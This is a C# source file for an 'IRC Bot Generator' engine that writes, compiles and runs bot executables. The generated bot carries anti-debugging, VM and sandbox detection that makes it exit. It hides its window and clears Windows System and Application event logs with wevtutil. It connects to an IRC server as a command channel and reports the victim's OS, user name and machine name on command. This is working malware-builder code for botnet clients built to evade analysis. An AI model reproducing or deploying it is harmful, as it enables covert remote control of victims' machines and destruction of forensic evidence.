using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Linq;
using System.Diagnostics;

namespace RawrZDesktop.Engines
{
    public class IrcBotEngine : IEngine
    {
        public string Name => "IRC Bot Generator";
        public string Description => "Advanced IRC bot with encryption and stealth capabilities";
        public string Version => "2.0.0";

        public async Task<EngineResult> ExecuteAsync(Dictionary<string, object> parameters)
        {
            try
            {
                var operation = parameters["operation"]?.ToString() ?? "generate";
                
                switch (operation.ToLower())
                {
                    case "generate":
                        return await GenerateIrcBotAsync(parameters);
                    case "compile":
                        return await CompileIrcBotAsync(parameters);
                    case "test":
                        return await TestIrcBotAsync(parameters);
                    default:
                        return new EngineResult
                        {
                            Success = false,
                            Error = $"Unsupported operation: {operation}"
                        };
                }
            }
            catch (Exception ex)
            {
                return new EngineResult
                {
                    Success = false,
                    Error = ex.Message
                };
            }
        }

        private async Task<EngineResult> GenerateIrcBotAsync(Dictionary<string, object> parameters)
        {
            var server = parameters.GetValueOrDefault("server", "irc.rizon.net").ToString();
            var port = int.Parse(parameters.GetValueOrDefault("port", "6667").ToString());
            var channels = parameters.GetValueOrDefault("channels", "#rawr").ToString().Split(',');
            var nick = parameters.GetValueOrDefault("nick", "RawrZBot").ToString();
            var username = parameters.GetValueOrDefault("username", "rawrzuser").ToString();
            var realname = parameters.GetValueOrDefault("realname", "RawrZ Security Bot").ToString();
            var password = parameters.GetValueOrDefault("password", "").ToString();
            var encryption = parameters.GetValueOrDefault("encryption", "aes-256-gcm").ToString();
            var stealth = bool.Parse(parameters.GetValueOrDefault("stealth", "true").ToString());
            var antiAnalysis = bool.Parse(parameters.GetValueOrDefault("antiAnalysis", "true").ToString());

            var botCode = GenerateIrcBotCode(server, port, channels, nick, username, realname, password, encryption, stealth, antiAnalysis);
            
            var timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH-mm-ss");
            var filename = $"irc-bot-{timestamp}.cs";
            var filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), filename);
            
            await File.WriteAllTextAsync(filepath, botCode);

            return new EngineResult
            {
                Success = true,
                Data = Encoding.UTF8.GetBytes(botCode),
                Metadata = new Dictionary<string, object>
                {
                    ["filename"] = filename,
                    ["filepath"] = filepath,
                    ["server"] = server,
                    ["port"] = port,
                    ["channels"] = string.Join(",", channels),
                    ["nick"] = nick,
                    ["encryption"] = encryption,
                    ["stealth"] = stealth
                }
            };
        }

        private async Task<EngineResult> CompileIrcBotAsync(Dictionary<string, object> parameters)
        {
            var sourceCode = parameters["sourceCode"]?.ToString();
            if (string.IsNullOrEmpty(sourceCode))
            {
                return new EngineResult
                {
                    Success = false,
                    Error = "Source code is required for compilation"
                };
            }

            var outputPath = parameters.GetValueOrDefault("outputPath", "").ToString();
            if (string.IsNullOrEmpty(outputPath))
            {
                var timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH-mm-ss");
                outputPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), $"irc-bot-{timestamp}.exe");
            }

            var compilationResult = await CompileWithRoslyn(sourceCode, outputPath);
            
            return new EngineResult
            {
                Success = compilationResult.Success,
                Data = compilationResult.Success ? File.ReadAllBytes(outputPath) : new byte[0],
                Error = compilationResult.Error,
                Metadata = new Dictionary<string, object>
                {
                    ["outputPath"] = outputPath,
                    ["compilationTime"] = compilationResult.CompilationTime,
                    ["warnings"] = compilationResult.Warnings,
                    ["errors"] = compilationResult.Errors
                }
            };
        }

        private async Task<EngineResult> TestIrcBotAsync(Dictionary<string, object> parameters)
        {
            var executablePath = parameters["executablePath"]?.ToString();
            if (string.IsNullOrEmpty(executablePath) || !File.Exists(executablePath))
            {
                return new EngineResult
                {
                    Success = false,
                    Error = "Valid executable path is required for testing"
                };
            }

            // Test the compiled executable
            var testResult = await TestExecutable(executablePath);
            
            return new EngineResult
            {
                Success = testResult.Success,
                Data = Encoding.UTF8.GetBytes(testResult.Output),
                Error = testResult.Error,
                Metadata = new Dictionary<string, object>
                {
                    ["exitCode"] = testResult.ExitCode,
                    ["executionTime"] = testResult.ExecutionTime,
                    ["testPassed"] = testResult.Success
                }
            };
        }

        private string GenerateIrcBotCode(string server, int port, string[] channels, string nick, string username, string realname, string password, string encryption, bool stealth, bool antiAnalysis)
        {
            var sb = new StringBuilder();
            
            sb.AppendLine("using System;");
            sb.AppendLine("using System.Collections.Generic;");
            sb.AppendLine("using System.IO;");
            sb.AppendLine("using System.Net.Sockets;");
            sb.AppendLine("using System.Text;");
            sb.AppendLine("using System.Threading;");
            sb.AppendLine("using System.Threading.Tasks;");
            sb.AppendLine("using System.Text.RegularExpressions;");
            sb.AppendLine("using System.Security.Cryptography;");
            sb.AppendLine("using System.Linq;");
            sb.AppendLine("using System.Diagnostics;");
            sb.AppendLine("using System.Runtime.InteropServices;");
            sb.AppendLine();
            sb.AppendLine("namespace RawrZBot");
            sb.AppendLine("{");
            sb.AppendLine("    public class IRCBot");
            sb.AppendLine("    {");
            
            // Anti-analysis code
            if (antiAnalysis)
            {
                sb.AppendLine(GenerateAntiAnalysisCode());
            }
            
            // Stealth code
            if (stealth)
            {
                sb.AppendLine(GenerateStealthCode());
            }
            
            // Encryption code
            sb.AppendLine(GenerateEncryptionCode(encryption));
            
            // Main bot class
            sb.AppendLine(GenerateMainBotClass(server, port, channels, nick, username, realname, password));
            
            sb.AppendLine("    }");
            sb.AppendLine();
            sb.AppendLine("    class Program");
            sb.AppendLine("    {");
            sb.AppendLine("        static void Main(string[] args)");
            sb.AppendLine("        {");
            sb.AppendLine("            try");
            sb.AppendLine("            {");
            sb.AppendLine("                var bot = new IRCBot();");
            sb.AppendLine("                bot.Start();");
            sb.AppendLine("            }");
            sb.AppendLine("            catch (Exception ex)");
            sb.AppendLine("            {");
            sb.AppendLine("                Console.WriteLine($\"[ERROR] {ex.Message}\");");
            sb.AppendLine("            }");
            sb.AppendLine("        }");
            sb.AppendLine("    }");
            sb.AppendLine("}");
            
            return sb.ToString();
        }

        private string GenerateAntiAnalysisCode()
        {
            return @"
        // Anti-analysis and anti-debugging measures
        [DllImport(""kernel32.dll"")]
        private static extern bool IsDebuggerPresent();
        
        [DllImport(""kernel32.dll"")]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
        
        private static bool IsRunningInVM()
        {
            try
            {
                var processes = Process.GetProcesses();
                var vmProcesses = new[] { ""vmtoolsd"", ""vmwaretray"", ""vmwareuser"", ""VGAuthService"", ""vmacthlp"", ""vboxservice"", ""vboxtray"" };
                return processes.Any(p => vmProcesses.Contains(p.ProcessName.ToLower()));
            }
            catch { return false; }
        }
        
        private static bool IsSandboxed()
        {
            try
            {
                var drives = DriveInfo.GetDrives();
                return drives.Length < 2 || drives.Any(d => d.TotalSize < 100000000000); // Less than 100GB
            }
            catch { return false; }
        }
        
        private static void AntiAnalysis()
        {
            if (IsDebuggerPresent() || IsRunningInVM() || IsSandboxed())
            {
                Environment.Exit(0);
            }
        }
";
        }

        private string GenerateStealthCode()
        {
            return @"
        // Stealth and evasion techniques
        private static void HideProcess()
        {
            try
            {
                var currentProcess = Process.GetCurrentProcess();
                currentProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            }
            catch { }
        }
        
        private static void ClearEventLogs()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = ""cmd"",
                    Arguments = ""/c wevtutil cl System & wevtutil cl Application"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
            }
            catch { }
        }
";
        }

        private string GenerateEncryptionCode(string encryption)
        {
            return $@"
        // Encryption utilities
        private static class Crypto
        {{
            private static readonly byte[] Key = Encoding.UTF8.GetBytes(""RawrZBot2024SecretKey!@#$%^&*()"");
            private static readonly byte[] IV = Encoding.UTF8.GetBytes(""RawrZBot2024IV!"");
            
            public static string Encrypt(string plainText)
            {{
                try
                {{
                    using var aes = Aes.Create();
                    aes.Key = Key;
                    aes.IV = IV;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    
                    using var encryptor = aes.CreateEncryptor();
                    var plainBytes = Encoding.UTF8.GetBytes(plainText);
                    var encryptedBytes = encryptor.TransformFinalBlock(plainBytes, 0, plainBytes.Length);
                    return Convert.ToBase64String(encryptedBytes);
                }}
                catch {{ return plainText; }}
            }}
            
            public static string Decrypt(string cipherText)
            {{
                try
                {{
                    using var aes = Aes.Create();
                    aes.Key = Key;
                    aes.IV = IV;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    
                    using var decryptor = aes.CreateDecryptor();
                    var cipherBytes = Convert.FromBase64String(cipherText);
                    var decryptedBytes = decryptor.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);
                    return Encoding.UTF8.GetString(decryptedBytes);
                }}
                catch {{ return cipherText; }}
            }}
        }}
";
        }

        private string GenerateMainBotClass(string server, int port, string[] channels, string nick, string username, string realname, string password)
        {
            var channelsStr = string.Join(", ", channels.Select(c => $"\"{c}\""));
            
            return $@"
        private TcpClient _client;
        private NetworkStream _stream;
        private StreamReader _reader;
        private StreamWriter _writer;
        private bool _connected;
        private bool _running;
        private readonly string _server = ""{server}"";
        private readonly int _port = {port};
        private readonly string[] _channels = new[] {{ {channelsStr} }};
        private readonly string _nick = ""{nick}"";
        private readonly string _username = ""{username}"";
        private readonly string _realname = ""{realname}"";
        private readonly string _password = ""{password}"";
        
        public void Start()
        {{
            AntiAnalysis();
            HideProcess();
            
            _running = true;
            Connect();
            
            while (_running)
            {{
                try
                {{
                    if (!_connected)
                    {{
                        Thread.Sleep(5000);
                        Connect();
                        continue;
                    }}
                    
                    var line = _reader.ReadLine();
                    if (line != null)
                    {{
                        HandleMessage(line);
                    }}
                }}
                catch (Exception ex)
                {{
                    Console.WriteLine($""[ERROR] {{ex.Message}}"");
                    _connected = false;
                    Thread.Sleep(5000);
                }}
            }}
        }}
        
        private void Connect()
        {{
            try
            {{
                _client = new TcpClient();
                _client.Connect(_server, _port);
                _stream = _client.GetStream();
                _reader = new StreamReader(_stream);
                _writer = new StreamWriter(_stream) {{ AutoFlush = true }};
                
                if (!string.IsNullOrEmpty(_password))
                {{
                    _writer.WriteLine($""PASS {{_password}}"");
                }}
                
                _writer.WriteLine($""NICK {{_nick}}"");
                _writer.WriteLine($""USER {{_username}} 0 * :{{_realname}}"");
                
                _connected = true;
                Console.WriteLine($""[BOT] Connected to {{_server}}:{{_port}}"");
            }}
            catch (Exception ex)
            {{
                Console.WriteLine($""[ERROR] Connection failed: {{ex.Message}}"");
                _connected = false;
            }}
        }}
        
        private void HandleMessage(string message)
        {{
            Console.WriteLine($""[IRC] {{message}}"");
            
            if (message.StartsWith(""PING""))
            {{
                var response = message.Replace(""PING"", ""PONG"");
                _writer.WriteLine(response);
                return;
            }}
            
            if (message.Contains(""376"") || message.Contains(""422""))
            {{
                foreach (var channel in _channels)
                {{
                    _writer.WriteLine($""JOIN {{channel}}"");
                }}
                return;
            }}
            
            var match = Regex.Match(message, @""^:([^!]+)!([^@]+)@([^\\s]+)\\s+PRIVMSG\\s+([^\\s]+)\\s+:(.*)$"");
            if (match.Success)
            {{
                var sender = match.Groups[1].Value;
                var target = match.Groups[4].Value;
                var text = match.Groups[5].Value;
                
                HandleCommand(sender, target, text);
            }}
        }}
        
        private void HandleCommand(string sender, string target, string command)
        {{
            var parts = command.Split(' ');
            var cmd = parts[0].ToLower();
            
            switch (cmd)
            {{
                case ""!ping"":
                    SendMessage(target, ""Pong! Bot is alive."");
                    break;
                case ""!info"":
                    SendMessage(target, ""RawrZ Security Bot v2.0 - Advanced IRC Bot with encryption and stealth capabilities"");
                    break;
                case ""!encrypt"":
                    if (parts.Length > 1)
                    {{
                        var text = string.Join("" "", parts.Skip(1));
                        var encrypted = Crypto.Encrypt(text);
                        SendMessage(target, $""Encrypted: {{encrypted}}"");
                    }}
                    break;
                case ""!decrypt"":
                    if (parts.Length > 1)
                    {{
                        var text = string.Join("" "", parts.Skip(1));
                        var decrypted = Crypto.Decrypt(text);
                        SendMessage(target, $""Decrypted: {{decrypted}}"");
                    }}
                    break;
                case ""!system"":
                    var systemInfo = $""OS: {{Environment.OSVersion}}, User: {{Environment.UserName}}, Machine: {{Environment.MachineName}}"";
                    SendMessage(target, systemInfo);
                    break;
                case ""!exit"":
                    if (sender.ToLower() == ""{nick.ToLower()}"")
                    {{
                        SendMessage(target, ""Shutting down..."");
                        _running = false;
                    }}
                    break;
            }}
        }}
        
        private void SendMessage(string target, string message)
        {{
            try
            {{
                _writer.WriteLine($""PRIVMSG {{target}} :{{message}}"");
            }}
            catch (Exception ex)
            {{
                Console.WriteLine($""[ERROR] Failed to send message: {{ex.Message}}"");
            }}
        }}
";
        }

        private async Task<CompilationResult> CompileWithRoslyn(string sourceCode, string outputPath)
        {
            try
            {
                var syntaxTree = Microsoft.CodeAnalysis.CSharp.CSharpSyntaxTree.ParseText(sourceCode);
                
                var references = new Microsoft.CodeAnalysis.MetadataReference[]
                {
                    Microsoft.CodeAnalysis.MetadataReference.CreateFromFile(typeof(object).Assembly.Location),
                    Microsoft.CodeAnalysis.MetadataReference.CreateFromFile(typeof(Console).Assembly.Location),
                    Microsoft.CodeAnalysis.MetadataReference.CreateFromFile(typeof(System.Net.Sockets.TcpClient).Assembly.Location),
                    Microsoft.CodeAnalysis.MetadataReference.CreateFromFile(typeof(System.Security.Cryptography.Aes).Assembly.Location),
                    Microsoft.CodeAnalysis.MetadataReference.CreateFromFile(typeof(System.Diagnostics.Process).Assembly.Location),
                    Microsoft.CodeAnalysis.MetadataReference.CreateFromFile(typeof(System.Runtime.InteropServices.DllImportAttribute).Assembly.Location),
                    Microsoft.CodeAnalysis.MetadataReference.CreateFromFile(typeof(System.Text.RegularExpressions.Regex).Assembly.Location),
                    Microsoft.CodeAnalysis.MetadataReference.CreateFromFile(typeof(System.Linq.Enumerable).Assembly.Location),
                    Microsoft.CodeAnalysis.MetadataReference.CreateFromFile(typeof(System.IO.DriveInfo).Assembly.Location),
                    Microsoft.CodeAnalysis.MetadataReference.CreateFromFile(typeof(System.ComponentModel.Component).Assembly.Location),
                    Microsoft.CodeAnalysis.MetadataReference.CreateFromFile(typeof(System.Runtime.CompilerServices.RuntimeHelpers).Assembly.Location)
                };

                var compilation = Microsoft.CodeAnalysis.CSharp.CSharpCompilation.Create(
                    "RawrZBot",
                    new[] { syntaxTree },
                    references,
                    new Microsoft.CodeAnalysis.CSharp.CSharpCompilationOptions(Microsoft.CodeAnalysis.OutputKind.ConsoleApplication));

                using var ms = new MemoryStream();
                var emitResult = compilation.Emit(ms);

                if (emitResult.Success)
                {
                    var assemblyBytes = ms.ToArray();
                    await File.WriteAllBytesAsync(outputPath, assemblyBytes);
                    
                    return new CompilationResult
                    {
                        Success = true,
                        CompilationTime = TimeSpan.Zero,
                        Warnings = emitResult.Diagnostics.Where(d => d.Severity == Microsoft.CodeAnalysis.DiagnosticSeverity.Warning).Select(d => d.GetMessage()).ToList(),
                        Errors = new List<string>()
                    };
                }
                else
                {
                    return new CompilationResult
                    {
                        Success = false,
                        Error = string.Join("\n", emitResult.Diagnostics.Select(d => d.GetMessage())),
                        Errors = emitResult.Diagnostics.Select(d => d.GetMessage()).ToList()
                    };
                }
            }
            catch (Exception ex)
            {
                return new CompilationResult
                {
                    Success = false,
                    Error = ex.Message
                };
            }
        }

        private async Task<TestResult> TestExecutable(string executablePath)
        {
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = executablePath,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using var process = Process.Start(startInfo);
                if (process == null)
                {
                    return new TestResult { Success = false, Error = "Failed to start process" };
                }

                var output = await process.StandardOutput.ReadToEndAsync();
                var error = await process.StandardError.ReadToEndAsync();
                
                // Wait for a short time to test basic functionality
                await Task.Delay(2000);
                
                if (!process.HasExited)
                {
                    process.Kill();
                }

                return new TestResult
                {
                    Success = true,
                    Output = output,
                    Error = error,
                    ExitCode = process.ExitCode,
                    ExecutionTime = TimeSpan.FromMilliseconds(2000)
                };
            }
            catch (Exception ex)
            {
                return new TestResult
                {
                    Success = false,
                    Error = ex.Message
                };
            }
        }
    }

    public class CompilationResult
    {
        public bool Success { get; set; }
        public string? Error { get; set; }
        public TimeSpan CompilationTime { get; set; }
        public List<string> Warnings { get; set; } = new();
        public List<string> Errors { get; set; } = new();
    }

    public class TestResult
    {
        public bool Success { get; set; }
        public string? Output { get; set; }
        public string? Error { get; set; }
        public int ExitCode { get; set; }
        public TimeSpan ExecutionTime { get; set; }
    }
}
